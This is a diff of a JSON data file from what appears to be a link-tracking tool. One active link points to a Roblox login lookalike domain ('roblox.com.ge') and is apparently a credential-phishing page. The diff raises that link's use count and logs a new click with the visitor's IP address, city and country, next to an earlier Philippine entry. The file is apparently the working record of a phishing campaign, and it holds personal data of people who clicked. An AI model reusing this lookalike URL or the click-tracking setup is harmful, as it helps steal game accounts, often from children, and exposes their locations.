@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1561,
+    "useCount": 1562,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12654,6 +12654,14 @@
         "ip": "180.191.232.142",
         "country": "Philippines",
         "city": "San Pedro",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777452269962,
+        "ip": "123.253.50.62",
+        "country": "Philippines",
+        "city": "Dasmariñas",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
